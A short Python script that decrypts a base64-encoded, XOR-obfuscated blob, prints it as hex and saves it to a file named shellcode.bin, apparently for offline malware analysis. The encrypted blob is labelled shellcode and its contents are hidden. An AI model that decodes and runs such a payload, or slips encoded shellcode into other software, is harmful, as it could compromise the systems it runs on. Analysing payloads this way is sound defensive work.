import base64

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted = bytearray()
    key_length = len(key_bytes)
    for i, b in enumerate(ciphertext_bytes):
        decrypted.append(b ^ key_bytes[i % key_length])
    return bytes(decrypted)

cipher_b64 = 'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
key_b64    = 'me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='

cipher = base64.b64decode(cipher_b64)
key    = base64.b64decode(key_b64)
decoded = xor_decrypt(cipher, key)

# Print hex dump (no execution)
print(decoded.hex())
# Optionally write to file for offline analysis:
with open('shellcode.bin', 'wb') as f:
    f.write(decoded)

